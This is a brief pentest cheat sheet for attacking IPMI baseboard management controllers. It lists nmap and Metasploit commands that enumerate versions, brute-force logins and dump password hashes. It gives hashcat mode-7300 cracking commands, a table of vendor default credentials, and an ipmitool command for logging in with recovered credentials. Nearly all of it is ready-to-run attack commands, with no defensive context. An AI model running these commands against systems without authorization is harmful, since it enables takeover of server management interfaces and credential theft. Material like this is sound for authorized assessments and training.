
## Nmap Enumeration

```bash
sudo nmap -sU -p 623 --script ipmi-version <IP>
```

```bash
sudo nmap -sU -p 623 --script ipmi-brute <IP>
```

```bash
sudo nmap -sU -p 623 --script ipmi-dumphashes <IP>
```

---

## Metasploit Enumeration

```bash
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <IP>run
```

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <IP>run
```

---

## Hashcat (IPMI hash cracking)

```bash
hashcat -m 7300 ipmi.hash <wordlist>
```

```bash
hashcat -m 7300 ipmi.hash -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

---

## Default IPMI Credentials

| Product | Username | Password |
|----------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-character string (A-Z, 0-9) |
| Supermicro IPMI | ADMIN | ADMIN 

---

## IPMI Access (if web/CLI available)

```bash
ipmitool -I lanplus -H <IP> -U <user> -P <pass> chassis status
```